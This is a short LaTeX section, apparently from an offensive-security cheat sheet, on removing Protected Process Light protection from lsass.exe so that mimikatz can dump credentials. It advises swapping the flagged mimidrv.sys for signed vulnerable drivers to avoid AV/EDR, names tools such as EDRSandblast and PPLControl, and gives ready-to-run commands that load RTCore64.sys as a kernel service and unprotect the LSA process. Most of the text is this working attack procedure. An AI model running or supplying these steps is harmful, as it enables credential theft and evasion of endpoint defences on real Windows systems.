\section{RunAsPPL bypass}

usually trying to dump lsass using mimikatz result in the following error:
\begin{verbatim}
ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)
\end{verbatim}


Mimikatz driver \verb+mimidrv.sys+ can be used to remove the PPL protection of process lsass.exe. After that, attackers can dump the credentials. But as it is flagged by AV/EDR try to use signed drivers such as \verb+RTCore64.sys+ or \verb+ProcExp152.sys+

Some recent tools such as \href{https://github.com/wavestone-cdt/EDRSandblast}{EDRSandblast}, \href{https://github.com/itm4n/PPLcontrol}{PPLControl} and \href{https://github.com/OmriBaso/RToolZ}{RToolZ} can abuse a vulnerable driver to remove PPL.


using \href{https://github.com/RedCursorSecurityConsulting/PPLKiller/blob/master/driver/RTCore64.sys}{RTCore64.sys}:
\begin{verbatim}
sc.exe create RTCore64 type= kernel start= auto binPath= <path>\RTCore64.sys DisplayName= "control"
net start RTCore64
PPLcontrol.exe list
PPLcontrol.exe unprotect <lsa_pid>
\end{verbatim}
